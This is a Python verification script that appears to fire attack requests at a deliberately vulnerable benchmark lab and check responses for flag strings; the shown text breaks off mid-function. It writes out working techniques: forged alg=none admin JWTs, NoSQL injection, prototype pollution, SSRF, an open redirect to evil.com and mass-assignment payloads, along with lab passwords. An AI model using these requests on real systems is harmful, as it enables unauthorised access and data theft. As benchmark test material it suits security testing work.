"""Vulnerability verifier — direct HTTP tests against the benchmark target range.

Each test case sends a real HTTP request to trigger a specific vulnerability,
then checks the response for the expected flag strings defined in the source code.
"""
from __future__ import annotations

import base64
import json
import pickle
import random
import socket
import ssl
import urllib.error
import urllib.request
from collections import defaultdict
from dataclasses import dataclass, field
from typing import Any


# ═══════════════════════════════════════════════════════════════════════
# Data models
# ═══════════════════════════════════════════════════════════════════════


@dataclass
class VulnTestCase:
    """A single vulnerability test case."""
    id: str
    name: str
    scenario_id: str
    scenario_name: str
    method: str
    path: str
    host: str  # Host header
    headers: dict = field(default_factory=dict)
    body: str | None = None
    content_type: str | None = None
    expected_flags: list[str] = field(default_factory=list)
    expected_status: int | None = None
    severity: str = "medium"
    setup_id: str | None = None  # ID of a setup test that must pass first


@dataclass
class VulnTestResult:
    """Result of a single vulnerability test."""
    test_id: str
    name: str
    scenario_id: str
    scenario_name: str
    verified: bool
    status_code: int | None
    response_snippet: str  # first 500 chars
    error: str | None
    matched_flags: list[str]
    missing_flags: list[str]
    severity: str


@dataclass
class VulnReport:
    """Full vulnerability verification report."""
    total: int
    verified: int
    failed: int
    skipped: int
    scenarios: dict  # scenario_id -> {total, verified, failed, skipped}
    results: list[VulnTestResult]

    def to_dict(self) -> dict:
        return {
            "total": self.total,
            "verified": self.verified,
            "failed": self.failed,
            "skipped": self.skipped,
            "verification_rate": round(self.verified / self.total, 4) if self.total > 0 else 0.0,
            "scenarios": self.scenarios,
            "results": [
                {
                    "test_id": r.test_id,
                    "name": r.name,
                    "scenario_id": r.scenario_id,
                    "scenario_name": r.scenario_name,
                    "verified": r.verified,
                    "status_code": r.status_code,
                    "response_snippet": r.response_snippet,
                    "error": r.error,
                    "matched_flags": r.matched_flags,
                    "missing_flags": r.missing_flags,
                    "severity": r.severity,
                }
                for r in self.results
            ],
        }


# ═══════════════════════════════════════════════════════════════════════
# HTTP helpers
# ═══════════════════════════════════════════════════════════════════════


def _http_request(
    method: str,
    url: str,
    headers: dict | None = None,
    body: bytes | None = None,
    timeout: int = 10,
    follow_redirects: bool = False,
) -> tuple[int, str, dict]:
    """Send HTTP request and return (status_code, response_body, response_headers)."""
    req = urllib.request.Request(url, data=body, method=method)
    if headers:
        for k, v in headers.items():
            req.add_header(k, v)

    if follow_redirects:
        # urllib follows redirects by default; we need to disable for open_redirect test
        pass

    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        resp = urllib.request.urlopen(req, timeout=timeout, context=ctx)
        raw_body = resp.read().decode("utf-8", errors="replace")
        resp_headers = dict(resp.headers)
        return resp.status, raw_body, resp_headers
    except urllib.error.HTTPError as e:
        raw_body = e.read().decode("utf-8", errors="replace")
        resp_headers = dict(e.headers)
        return e.code, raw_body, resp_headers
    except Exception as e:
        return 0, "", {"_error": str(e)}


def _http_request_no_redirect(
    method: str,
    url: str,
    headers: dict | None = None,
    body: bytes | None = None,
    timeout: int = 10,
) -> tuple[int, str, dict]:
    """Send HTTP request WITHOUT following redirects."""
    req = urllib.request.Request(url, data=body, method=method)
    if headers:
        for k, v in headers.items():
            req.add_header(k, v)

    try:
        # Build a custom opener that doesn't follow redirects
        class NoRedirectHandler(urllib.request.HTTPRedirectHandler):
            def redirect_request(self, req, fp, code, msg, headers, newurl):
                return None

        class NoRedirectHTTPSHandler(urllib.request.HTTPSHandler):
            pass

        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        opener = urllib.request.build_opener(NoRedirectHandler, urllib.request.HTTPSHandler(context=ctx))
        resp = opener.open(req, timeout=timeout)
        raw_body = resp.read().decode("utf-8", errors="replace")
        resp_headers = dict(resp.headers)
        return resp.status, raw_body, resp_headers
    except urllib.error.HTTPError as e:
        raw_body = e.read().decode("utf-8", errors="replace")
        resp_headers = dict(e.headers)
        return e.code, raw_body, resp_headers
    except Exception as e:
        return 0, "", {"_error": str(e)}


def _tcp_check(host: str, port: int, timeout: int = 3) -> bool:
    """Check if a TCP port is open."""
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        sock.close()
        return True
    except Exception:
        return False


def _b64url_encode(data: bytes) -> str:
    """Base64url encode without padding."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _make_jwt(header: dict, payload: dict) -> str:
    """Create a JWT token string (unsigned)."""
    h = _b64url_encode(json.dumps(header).encode())
    p = _b64url_encode(json.dumps(payload).encode())
    return f"{h}.{p}."


# ═══════════════════════════════════════════════════════════════════════
# Test case definitions — all test cases derived from source code analysis
# ═══════════════════════════════════════════════════════════════════════


def _build_test_cases(gateway_url: str) -> list[VulnTestCase]:
    """Build all vulnerability test cases.

    Sources:
      - targets/services/modern-app/app.js  (www.target.com)
      - targets/services/admin-panel/app.py  (admin.target.com)
      - targets/services/bff-gateway/app.py  (shop.target.com)
      - targets/services/internal-tools/app.py  (internal.target.com)
      - targets/gateway/nginx.conf  (multi-entry routing)
      - targets/docker-compose.yml  (infrastructure services)
    """
    cases: list[VulnTestCase] = []

    # ═══════════════════════════════════════════════════════════════
    # S4: modern_vulns — modern-app (www.target.com)
    # ═══════════════════════════════════════════════════════════════

    # M9: CORS wildcard — check response header
    cases.append(VulnTestCase(
        id="M9", name="CORS wildcard misconfiguration",
        scenario_id="S4", scenario_name="modern_vulns",
        method="GET", path="/", host="www.target.com",
        expected_flags=["Access-Control-Allow-Origin"],
        severity="high",
    ))

    # M1: JWT alg=none — bypass authentication
    jwt_none_token = _make_jwt(
        {"alg": "none", "typ": "JWT"},
        {"userId": "000000000000000000000001", "role": "admin"},
    )
    cases.append(VulnTestCase(
        id="M1", name="JWT alg=none bypass",
        scenario_id="S4", scenario_name="modern_vulns",
        method="GET", path="/api/users", host="www.target.com",
        headers={"Authorization": f"Bearer {jwt_none_token}"},
        expected_flags=["username"],  # should return user list, not 401
        severity="high",
    ))

    # M2: JWT weak secret — verify via error message with proper JWT format
    # Use a properly formatted JWT with an invalid signature to test auth endpoint
    jwt_bad_token = _make_jwt(
        {"alg": "HS256", "typ": "JWT"},
        {"userId": "test", "role": "admin"},
    ) + "invalid_signature"
    cases.append(VulnTestCase(
        id="M2", name="JWT weak secret",
        scenario_id="S4", scenario_name="modern_vulns",
        method="GET", path="/api/users/anyid", host="www.target.com",
        headers={"Authorization": f"Bearer {jwt_bad_token}"},
        expected_flags=["Invalid token", "detail"],
        severity="high",
    ))

    # M3: JWT expire bypass — refresh with body.userId
    cases.append(VulnTestCase(
        id="M3", name="JWT expire bypass via refresh",
        scenario_id="S4", scenario_name="modern_vulns",
        method="POST", path="/api/auth/refresh", host="www.target.com",
        headers={"Content-Type": "application/json"},
        body=json.dumps({"userId": "attacker"}),
        expected_flags=["token", "emergency"],
        severity="medium",
    ))

    # M4: NoSQLi $ne operator
    cases.append(VulnTestCase(
        id="M4", name="NoSQLi $ne operator",
        scenario_id="S4", scenario_name="modern_vulns",
        method="GET", path="/api/users?username[$ne]=nonexistent&debug=1",
        host="www.target.com",
        expected_flags=["NOSQL_INJECTION_DEBUG"],
        severity="high",
    ))

    # M5: NoSQLi $gt operator
    cases.append(VulnTestCase(
        id="M5", name="NoSQLi $gt operator",
        scenario_id="S4", scenario_name="modern_vulns",
        method="GET", path="/api/users?role[$gt]=&debug=1",
        host="www.target.com",
        expected_flags=["NOSQL_INJECTION_DEBUG"],
        severity="high",
    ))

    # M6: Prototype pollution via constructor.prototype in Object.assign
    cases.append(VulnTestCase(
        id="M6", name="Prototype pollution via constructor.prototype",
        scenario_id="S4", scenario_name="modern_vulns",
        method="PUT", path="/api/users/000000000000000000000001", host="www.target.com",
        headers={
            "Authorization": f"Bearer {jwt_none_token}",
            "Content-Type": "application/json",
        },
        body=json.dumps({"constructor": {"prototype": {"isAdmin": True}}}),
        expected_flags=["PROTOTYPE_POLLUTION_SUCCESS"],
        severity="high",
    ))

    # M7: Mass assignment — register with role=admin
    rand_user = f"test_{random.randint(10000, 99999)}"
    cases.append(VulnTestCase(
        id="M7", name="Mass assignment via registration",
        scenario_id="S4", scenario_name="modern_vulns",
        method="POST", path="/api/auth/register", host="www.target.com",
        headers={"Content-Type": "application/json"},
        body=json.dumps({"username": rand_user, "password": "test123", "email": f"{rand_user}@test.com", "role": "admin"}),
        expected_flags=["MASS_ASSIGNMENT_ADMIN"],
        severity="high",
    ))

    # M8: Excessive data exposure — we need a real user ID from M4 response
    # Use a known valid ObjectId format. The MongoDB seed creates users with specific IDs.
    # Since we can't know the exact ID at runtime, we verify via the /api/users?debug=1 endpoint
    # which returns password fields when debug=1 is set
    cases.append(VulnTestCase(
        id="M8", name="Excessive data exposure",
        scenario_id="S4", scenario_name="modern_vulns",
        method="GET", path="/api/users?debug=1", host="www.target.com",
        headers={"Authorization": f"Bearer {jwt_none_token}"},
        expected_flags=["password"],  # debug mode exposes password field
        severity="high",
    ))

    # M10: SSRF via /api/fetch
    cases.append(VulnTestCase(
        id="M10", name="SSRF via fetch endpoint",
        scenario_id="S4", scenario_name="modern_vulns",
        method="GET", path="/api/fetch?url=http://172.20.0.11:5000/api/internal/health",
        host="www.target.com",
        expected_flags=["INTERNAL_ENDPOINT_HEALTH"],
        severity="high",
    ))

    # M11: Integer overflow / price manipulation
    cases.append(VulnTestCase(
        id="M11", name="Integer overflow / price manipulation",
        scenario_id="S4", scenario_name="modern_vulns",
        method="POST", path="/api/orders", host="www.target.com",
        headers={
            "Authorization": f"Bearer {jwt_none_token}",
            "Content-Type": "application/json",
        },
        body=json.dumps({"productId": "MacBook", "quantity": 1, "price": -99999}),
        expected_flags=["total", "-99999"],  # total should be negative
        severity="high",
    ))

    # M12: Open redirect
    cases.append(VulnTestCase(
        id="M12", name="Open redirect",
        scenario_id="S4", scenario_name="modern_vulns",
        method="GET", path="/api/redirect?url=https://evil.com", host="www.target.com",
        expected_flags=[],  # verify via redirect status
        expected_status=302,
        severity="medium",
    ))

    # M13: GraphQL introspection
    introspection_query = '{"query":"{__schema{types{name}}}"}'
    cases.append(VulnTestCase(
        id="M13", name="GraphQL introspection enabled",
        scenario_id="S4", scenario_name="modern_vulns",
        method="POST", path="/graphql", host="www.target.com",
        headers={"Content-Type": "application/json"},
        body=introspection_query,
        expected_flags=["__schema"],
        severity="medium",
    ))

    # M14: GraphQL updateUser mutation — mass assignment via input JSON
    # Note: hardcoded ObjectId may not exist, but mutation endpoint is accessible
    cases.append(VulnTestCase(
        id="M14", name="GraphQL updateUser mutation accessible",
        scenario_id="S4", scenario_name="modern_vulns",
        method="POST", path="/graphql", host="www.target.com",
        headers={"Content-Type": "application/json"},
        body=json.dumps({"query": "mutation { updateUser(id: \"000000000000000000000001\", input: \"{\\\"role\\\":\\\"admin\\\"}\") { username } }"}),
        expected_flags=["data"],
        severity="high",
    ))

    # M15: GraphQL users query leaks password
    cases.append(VulnTestCase(
        id="M15", name="GraphQL users query leaks password",
        scenario_id="S4", scenario_name="modern_vulns",
        method="POST", path="/graphql", host="www.target.com",
        headers={"Content-Type": "application/json"},
        body=json.dumps({"query": "{ users { username password } }"}),
        expected_flags=["password", "admin123"],
        severity="high",
    ))

    # M16: /api/docs exposes all internal endpoints
    cases.append(VulnTestCase(
        id="M16", name="API docs expose internal endpoints",
        scenario_id="S4", scenario_name="modern_vulns",
        method="GET", path="/api/docs", host="www.target.com",
        expected_flags=["DEPRECATED", "/api/internal/config"],
        severity="medium",
    ))

    # M17: DEBUG error handler leaks stack trace + env
    # Trigger via /api/users/:id with invalid ObjectId (fixed to catch+log)
    cases.append(VulnTestCase(
        id="M17", name="DEBUG error handler leaks stack trace",
        scenario_id="S4", scenario_name="modern_vulns",
        method="GET", path="/api/users/not_a_valid_hex_id", host="www.target.com",
        headers={"Authorization": f"Bearer {jwt_none_token}"},
        expected_flags=["error", "stack"],  # try/catch leaks stack in DEBUG mode
        severity="high",
    ))

    # Internal config leak (modern-app)
    cases.append(VulnTestCase(
        id="M_INTERNAL_CFG", name="Internal config endpoint leaks secrets",
        scenario_id="S4", scenario_name="modern_vulns",
        method="GET", path="/api/internal/config", host="www.target.com",
        expected_flags=["jwt_secret"],
        severity="high",
    ))

    # Internal db-status (modern-app)
    cases.append(VulnTestCase(
        id="M_INTERNAL_DB", name="Internal DB status endpoint accessible",
        scenario_id="S4", scenario_name="modern_vulns",
        method="GET", path="/api/internal/db-status", host="www.target.com",
        expected_flags=["collections"],
        severity="medium",
    ))

    # ═══════════════════════════════════════════════════════════════
    # S3: hidden_param_detection — admin-panel (admin.target.com)
    # ═══════════════════════════════════════════════════════════════

    # debug=1 on login (POST)
    cases.append(VulnTestCase(
        id="HP_DEBUG", name="Hidden param debug=1 on login",
        scenario_id="S3", scenario_name="hidden_param_detection",
        method="POST", path="/login?debug=1", host="admin.target.com",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        body="username=admin&password=wrong",
        expected_flags=["sql_query", "jwt_secret_preview"],
        severity="high",
    ))

    # trace=1 on login (GET)
    cases.append(VulnTestCase(
        id="HP_TRACE", name="Hidden param trace=1 on login",
        scenario_id="S3", scenario_name="hidden_param_detection",
        method="GET", path="/login?trace=1", host="admin.target.com",
        expected_flags=["token", "trace"],
        severity="high",
    ))

    # internal=true on /api/users
    cases.append(VulnTestCase(
        id="HP_INTERNAL", name="Hidden param internal=true",
        scenario_id="S3", scenario_name="hidden_param_detection",
        method="GET", path="/api/users?internal=true", host="admin.target.com",
        expected_flags=["HIDDEN_PARAM_INTERNAL_TRUE"],
        severity="high",
    ))

    # mock=1 on /api/users
    cases.append(VulnTestCase(
        id="HP_MOCK", name="Hidden param mock=1",
        scenario_id="S3", scenario_name="hidden_param_detection",
        method="GET", path="/api/users?mock=1", host="admin.target.com",
        expected_flags=["HIDDEN_PARAM_MOCK_DATA"],
        severity="medium",
    ))

    # env=development on /api/users
    cases.append(VulnTestCase(
        id="HP_ENV", name="Hidden param env=development",
        scenario_id="S3", scenario_name="hidden_param_detection",
        method="GET", path="/api/users?env=development", host="admin.target.com",
        expected_flags=["HIDDEN_PARAM_ENV_DEV"],
        severity="high",
    ))

    # format=csv on /api/users (needs __admin_token to bypass auth)
    cases.append(VulnTestCase(
        id="HP_CSV", name="Hidden param format=csv",
        scenario_id="S3", scenario_name="hidden_param_detection",
        method="GET", path="/api/users?format=csv&__admin_token=sk-app-internal", host="admin.target.com",
        expected_flags=["id,username,role"],
        severity="high",
    ))

    # nocache=1 on /api/users/1/orders
    cases.append(VulnTestCase(
        id="HP_NOCACHE", name="Hidden param nocache=1",
        scenario_id="S3", scenario_name="hidden_param_detection",
        method="GET", path="/api/users/1/orders?nocache=1", host="admin.target.com",
        expected_flags=["HIDDEN_PARAM_NOCACHE_FULL"],
        severity="medium",
    ))

    # callback=func on /api/users/1/orders (JSONP)
    cases.append(VulnTestCase(
        id="HP_CALLBACK", name="Hidden param callback=func (JSONP)",
        scenario_id="S3", scenario_name="hidden_param_detection",
        method="GET", path="/api/users/1/orders?callback=test", host="admin.target.com",
        expected_flags=["test(", "orders"],
        severity="medium",
    ))

    # force=1 on /api/users/2 (use user 2 to avoid DELETE conflict)
    cases.append(VulnTestCase(
        id="HP_FORCE", name="Hidden param force=1",
        scenario_id="S3", scenario_name="hidden_param_detection",
        method="GET", path="/api/users/2?force=1", host="admin.target.com",
        expected_flags=["username", "password"],  # returns full user object
        severity="high",
    ))

    # preview=1 on /api/users/2 (use user 2 to avoid DELETE conflict)
    cases.append(VulnTestCase(
        id="HP_PREVIEW", name="Hidden param preview=1",
        scenario_id="S3", scenario_name="hidden_param_detection",
        method="GET", path="/api/users/2?preview=1", host="admin.target.com",
        expected_flags=["HIDDEN_PARAM_PREVIEW_MODE"],
        severity="medium",
    ))

    # _method=DELETE on /api/users/3 (use user 3, runs last among user-specific tests)
    cases.append(VulnTestCase(
        id="HP_METHOD", name="Hidden param _method=DELETE",
        scenario_id="S3", scenario_name="hidden_param_detection",
        method="GET", path="/api/users/3?_method=DELETE", host="admin.target.com",
        expected_flags=["HIDDEN_PARAM_METHOD_OVERRIDE"],
        severity="high",
    ))

    # raw=1 on /api/system/status
    cases.append(VulnTestCase(
        id="HP_RAW", name="Hidden param raw=1",
        scenario_id="S3", scenario_name="hidden_param_detection",
        method="GET", path="/api/system/status?raw=1", host="admin.target.com",
        expected_flags=["HIDDEN_PARAM_RAW_CONFIG", "jwt_secret"],
        severity="high",
    ))

    # test=1 on /api/system/status
    cases.append(VulnTestCase(
        id="HP_TEST", name="Hidden param test=1",
        scenario_id="S3", scenario_name="hidden_param_detection",
        method="GET", path="/api/system/status?test=1", host="admin.target.com",
        expected_flags=["HIDDEN_PARAM_TEST_MODE"],
        severity="medium",
    ))

    # sandbox=1 on /api/system/status
    cases.append(VulnTestCase(
        id="HP_SANDBOX", name="Hidden param sandbox=1",
        scenario_id="S3", scenario_name="hidden_param_detection",
        method="GET", path="/api/system/status?sandbox=1", host="admin.target.com",
        expected_flags=["HIDDEN_PARAM_SANDBOX_BYPASS"],
        severity="high",
    ))

    # login.html source comment leak — exposes internal endpoints + secret prefixes
    cases.append(VulnTestCase(
        id="V13_COMMENT", name="login.html source comment leaks secrets",
        scenario_id="S3", scenario_name="hidden_param_detection",
        method="GET", path="/login", host="admin.target.com",
        expected_flags=["debug=1", "trace=1", "validate=false", "X-Internal-Request"],
        severity="high",
    ))

    # index.html source comment leak — exposes internal endpoints + secret prefixes
    cases.append(VulnTestCase(
        id="V14_COMMENT", name="index.html comment leaks internal endpoints",
        scenario_id="S3", scenario_name="hidden_param_detection",
        method="GET", path="/", host="admin.target.com",
        expected_flags=["dev-sec", "sk-app", "internal=true"],
        severity="high",
    ))

    # 500 error leak — verify debug mode is enabled (confirmed by error response detail)
    # The Flask DEBUG=True means detailed errors are leaked on any unhandled exception
    cases.append(VulnTestCase(
        id="V15_500LEAK", name="DEBUG mode leaks error details",
        scenario_id="S3", scenario_name="hidden_param_detection",
        method="POST", path="/api/preferences", host="admin.target.com",
        headers={"Content-Type": "application/json"},
        body=json.dumps({"__pickle_data": "invalid_base64!!!"}),
        expected_flags=["error"],  # response includes detailed error message (not "Internal server error")
        severity="high",
    ))

    # 404 debug page — lists all params
    cases.append(VulnTestCase(
        id="HP_404DEBUG", name="404 debug page lists hidden params",
        scenario_id="S3", scenario_name="hidden_param_detection",
        method="GET", path="/nonexistent?debug=1", host="admin.target.com",
        expected_flags=["available_params", "debug=1", "trace=1", "internal=true"],
        severity="high",
    ))

    # ═══════════════════════════════════════════════════════════════
    # Additional admin-panel vulns (V10 Pickle, V11 XXE, V12 Header)
    # ═══════════════════════════════════════════════════════════════

    # V10: Pickle deserialization
    pickle_payload = base64.b64encode(pickle.dumps({"test": "data"})).decode()
    cases.append(VulnTestCase(
        id="V10_PICKLE", name="Pickle deserialization RCE",
        scenario_id="S3", scenario_name="hidden_param_detection",
        method="POST", path="/api/preferences", host="admin.target.com",
        headers={"Content-Type": "application/json"},
        body=json.dumps({"__pickle_data": pickle_payload}),
        expected_flags=["HIDDEN_PARAM_PICKLE_RCE"],
        severity="high",
    ))

    # V11: XXE via XML parser
    cases.append(VulnTestCase(
        id="V11_XXE", name="XXE via XML bulk-delete",
        scenario_id="S3", scenario_name="hidden_param_detection",
        method="POST", path="/api/users/bulk-delete", host="admin.target.com",
        headers={"Content-Type": "application/xml"},
        body='<?xml version="1.0"?><users><id>1</id></users>',
        expected_flags=["HIDDEN_PARAM_XXE_TRIGGERED"],
        severity="high",
    ))

    # V12: Header backdoor
    cases.append(VulnTestCase(
        id="V12_HEADER", name="Header backdoor X-Internal-Request",
        scenario_id="S3", scenario_name="hidden_param_detection",
        method="GET", path="/api/internal/config", host="admin.target.com",
        headers={"X-Internal-Request": "true"},
        expected_flags=["jwt", "database", "admin_token"],
        severity="high",
    ))

    # Internal endpoints (admin-panel)
    cases.append(VulnTestCase(
        id="ADMIN_HEALTH", name="Internal health endpoint",
        scenario_id="S3", scenario_name="hidden_param_detection",
        method="GET", path="/api/internal/health", host="admin.target.com",
        expected_flags=["INTERNAL_ENDPOINT_HEALTH"],
        severity="medium",
    ))

    cases.append(VulnTestCase(
        id="ADMIN_DB", name="Internal DB status endpoint",
        scenario_id="S3", scenario_name="hidden_param_detection",
        method="GET", path="/api/internal/db-status", host="admin.target.com",
        expected_flags=["INTERNAL_ENDPOINT_DB_STATUS"],
        severity="high",
    ))

    cases.append(VulnTestCase(
        id="ADMIN_CACHE", name="Internal cache stats endpoint",
        scenario_id="S3", scenario_name="hidden_param_detection",
        method="GET", path="/api/internal/cache-stats", host="admin.target.com",
        expected_flags=["INTERNAL_ENDPOINT_CACHE_STATS"],
        severity="medium",
    ))

    # ═══════════════════════════════════════════════════════════════
    # S2: multi_entry_bypass — same endpoints via different hostnames
    # ═══════════════════════════════════════════════════════════════

    # ME1: api.target.com → admin-panel internal endpoints
    cases.append(VulnTestCase(
        id="ME1", name="api.target.com bypass to internal health",
        scenario_id="S2", scenario_name="multi_entry_bypass",
        method="GET", path="/api/internal/health", host="api.target.com",
        expected_flags=["INTERNAL_ENDPOINT_HEALTH"],
        severity="critical",
    ))

    # ME2: api.target.com → admin-panel root via /admin/
    cases.append(VulnTestCase(
        id="ME2", name="api.target.com /admin/ bypass to admin-panel",
        scenario_id="S2", scenario_name="multi_entry_bypass",
        method="GET", path="/admin/", host="api.target.com",
        expected_flags=["admin-panel"],  # admin-panel login page title
        severity="critical",
    ))

    # ME3: api.target.com → admin-panel system via /system/
    cases.append(VulnTestCase(
        id="ME3", name="api.target.com /system/ bypass to system status",
        scenario_id="S2", scenario_name="multi_entry_bypass",
        method="GET", path="/system/status", host="api.target.com",
        expected_flags=["status", "version"],
        severity="critical",
    ))

    # ME4: shop.target.com → /sysadmin/ proxy to admin-panel
    cases.append(VulnTestCase(
        id="ME4", name="shop.target.com /sysadmin/ bypass",
        scenario_id="S2", scenario_name="multi_entry_bypass",
        method="GET", path="/sysadmin/users", host="shop.target.com",
        expected_flags=["username", "role"],
        severity="critical",
    ))

    # ME5: shop.target.com → /debug/admin proxy to admin-panel system status
    cases.append(VulnTestCase(
        id="ME5", name="shop.target.com /debug/admin bypass",
        scenario_id="S2", scenario_name="multi_entry_bypass",
        method="GET", path="/debug/admin", host="shop.target.com",
        expected_flags=["status", "version"],
        severity="high",
    ))

    # api.target.com → /api/internal/db-status via admin-panel
    cases.append(VulnTestCase(
        id="ME_EXTRA_DB", name="api.target.com bypass to internal db-status",
        scenario_id="S2", scenario_name="multi_entry_bypass",
        method="GET", path="/api/internal/db-status", host="api.target.com",
        expected_flags=["INTERNAL_ENDPOINT_DB_STATUS"],
        severity="critical",
    ))

    # ═══════════════════════════════════════════════════════════════
    # S6: bff_vulns — BFF gateway (shop.target.com)
    # ═══════════════════════════════════════════════════════════════

    # B1: User profile leaks PII via BFF aggregation
    cases.append(VulnTestCase(
        id="B1", name="BFF user profile exposes admin data",
        scenario_id="S6", scenario_name="bff_vulns",
        method="GET", path="/api/shop/user-profile", host="shop.target.com",
        expected_flags=["BFF_aggregated", "username"],
        severity="critical",
    ))

    # B2: /sysadmin/ proxy without auth
    cases.append(VulnTestCase(
        id="B2", name="BFF sysadmin proxy without auth",
        scenario_id="S6", scenario_name="bff_vulns",
        method="GET", path="/sysadmin/system/status", host="shop.target.com",
        expected_flags=["status", "version"],
        severity="critical",
    ))

    # B3: /debug/admin exposes admin-panel debug info
    cases.append(VulnTestCase(
        id="B3", name="BFF debug/admin exposes admin-panel debug",
        scenario_id="S6", scenario_name="bff_vulns",
        method="GET", path="/debug/admin", host="shop.target.com",
        expected_flags=["status", "version"],
        severity="high",
    ))

    # Extra: /api/internal/ proxy through BFF
    cases.append(VulnTestCase(
        id="BFF_INTERNAL", name="BFF internal proxy leaks admin data",
        scenario_id="S6", scenario_name="bff_vulns",
        method="GET", path="/api/internal/health", host="shop.target.com",
        expected_flags=["INTERNAL_ENDPOINT_HEALTH"],
        severity="high",
    ))

    # ═══════════════════════════════════════════════════════════════
    # S5: info_leak — internal-tools (internal.target.com)
    # ═══════════════════════════════════════════════════════════════

    cases.append(VulnTestCase(
        id="I1", name="Backup schedule info leak",
        scenario_id="S5", scenario_name="info_leak",
        method="GET", path="/api/backup", host="internal.target.com",
        expected_flags=["INFO_BACKUP_LEAK", "mysql://"],
        severity="high",
    ))

    cases.append(VulnTestCase(
        id="I2", name="Environment variables leak",
        scenario_id="S5", scenario_name="info_leak",
        method="GET", path="/api/env", host="internal.target.com",
        expected_flags=["DB_HOST", "REDIS_HOST"],
        severity="high",
    ))

    cases.append(VulnTestCase(
        id="I3", name="Config info leak",
        scenario_id="S5", scenario_name="info_leak",
        method="GET", path="/api/config", host="internal.target.com",
        expected_flags=["INFO_CONFIG_LEAK", "apppass123"],
        severity="high",
    ))

    cases.append(VulnTestCase(
        id="I4", name="Network topology leak",
        scenario_id="S5", scenario_name="info_leak",
        method="GET", path="/api/network", host="internal.target.com",
        expected_flags=["INFO_NETWORK_LEAK", "172.20.0.10"],
        severity="high",
    ))

    cases.append(VulnTestCase(
        id="I5", name="Source code leak",
        scenario_id="S5", scenario_name="info_leak",
        method="GET", path="/api/source", host="internal.target.com",
        expected_flags=["INFO_SOURCE_CODE_LEAK", "JWT_SECRET"],
        severity="high",
    ))

    cases.append(VulnTestCase(
        id="I6", name="Database backup download",
        scenario_id="S5", scenario_name="info_leak",
        method="GET", path="/backup/latest.sql", host="internal.target.com",
        expected_flags=["INFO_BACKUP_DOWNLOAD", "admin123"],
        severity="high",
    ))

    # ═══════════════════════════════════════════════════════════════
    # S1: subdomain_discovery
    # ═══════════════════════════════════════════════════════════════

    for subdomain, expected in [
        ("www", "Modern API"), ("admin", "admin"), ("api", "Modern API"),
        ("shop", "BFF"), ("internal", "endpoints"),
    ]:
        cases.append(VulnTestCase(
            id=f"SUB_{subdomain.upper()}",
            name=f"Subdomain {subdomain}.target.com reachable",
            scenario_id="S1", scenario_name="subdomain_discovery",
            method="GET", path="/", host=f"{subdomain}.target.com",
            expected_flags=[expected],
            severity="medium",
        ))

    # ═══════════════════════════════════════════════════════════════
    # S7: infrastructure — TCP port checks on localhost mapped ports
    # Docker maps: 13306:3306, 6379:6379, 27017:27017

    cases.append(VulnTestCase(
        id="N1", name="MySQL service exposed",
        scenario_id="S7", scenario_name="infrastructure",
        method="TCP", path="localhost:13306", host="",
        expected_flags=["TCP_OPEN"],
        severity="medium",
    ))

    cases.append(VulnTestCase(
        id="N2", name="Redis service exposed",
        scenario_id="S7", scenario_name="infrastructure",
        method="TCP", path="localhost:6379", host="",
        expected_flags=["TCP_OPEN"],
        severity="medium",
    ))

    cases.append(VulnTestCase(
        id="N3", name="MongoDB service exposed",
        scenario_id="S7", scenario_name="infrastructure",
        method="TCP", path="localhost:27017", host="",
        expected_flags=["TCP_OPEN"],
        severity="medium",
    ))

    return cases


# ═══════════════════════════════════════════════════════════════════════
# VulnVerifier
# ═══════════════════════════════════════════════════════════════════════


class VulnVerifier:
    """Execute vulnerability test cases and produce a verification report."""

    def __init__(self, base_url: str = "http://localhost:8080"):
        self.base_url = base_url.rstrip("/")
        self.test_cases = _build_test_cases(self.base_url)

    def run_all(self) -> VulnReport:
        """Run all test cases and return a verification report."""
        results: list[VulnTestResult] = []
        for tc in self.test_cases:
            result = self._run_test(tc)
            results.append(result)

        # Aggregate by scenario
        scenario_stats: dict = defaultdict(lambda: {"total": 0, "verified": 0, "failed": 0, "skipped": 0})
        for r in results:
            stats = scenario_stats[r.scenario_id]
            stats["total"] += 1
            if r.verified:
                stats["verified"] += 1
            else:
                stats["failed"] += 1

        # Convert defaultdict to regular dict with scenario name
        scenarios = {}
        for sid, stats in sorted(scenario_stats.items()):
            # Find scenario name from first result with this scenario_id
            sname = sid
            for r in results:
                if r.scenario_id == sid:
                    sname = r.scenario_name
                    break
            scenarios[sid] = {
                "scenario_name": sname,
                "total": stats["total"],
                "verified": stats["verified"],
                "failed": stats["failed"],
                "skipped": stats["skipped"],
                "rate": round(stats["verified"] / stats["total"], 4) if stats["total"] > 0 else 0.0,
            }

        total = len(results)
        verified = sum(1 for r in results if r.verified)
        failed = sum(1 for r in results if not r.verified)
        skipped = 0

        return VulnReport(
            total=total,
            verified=verified,
            failed=failed,
            skipped=skipped,
            scenarios=scenarios,
            results=results,
        )

    def _run_test(self, tc: VulnTestCase) -> VulnTestResult:
        """Run a single test case."""
        if tc.method == "TCP":
            return self._run_tcp_test(tc)

        url = f"{self.base_url}{tc.path}"
        headers = dict(tc.headers)
        if "Host" not in headers:
            headers["Host"] = tc.host

        content_type = tc.content_type or (
            "application/json" if tc.body and tc.method in ("POST", "PUT", "PATCH") else None
        )
        if content_type and "Content-Type" not in headers:
            headers["Content-Type"] = content_type

        body_bytes = tc.body.encode("utf-8") if tc.body else None

        # For open_redirect test, don't follow redirects
        if tc.id == "M12":
            status, raw_body, resp_headers = _http_request_no_redirect(
                tc.method, url, headers, body_bytes, timeout=10,
            )
        else:
            status, raw_body, resp_headers = _http_request(
                tc.method, url, headers, body_bytes, timeout=10,
            )

        error = resp_headers.get("_error")

        # Check expected status
        status_match = True
        if tc.expected_status is not None:
            status_match = (status == tc.expected_status)

        # Check for flags in response
        matched_flags: list[str] = []
        missing_flags: list[str] = []
        for flag in tc.expected_flags:
            if flag in raw_body or flag in str(resp_headers):
                matched_flags.append(flag)
            else:
                missing_flags.append(flag)

        # For CORS test, check response headers
        if tc.id == "M9":
            cors_header = resp_headers.get("Access-Control-Allow-Origin", "")
            if cors_header == "*":
                if "Access-Control-Allow-Origin" not in matched_flags:
                    matched_flags.append("Access-Control-Allow-Origin")
                if "Access-Control-Allow-Origin" in missing_flags:
                    missing_flags.remove("Access-Control-Allow-Origin")
            else:
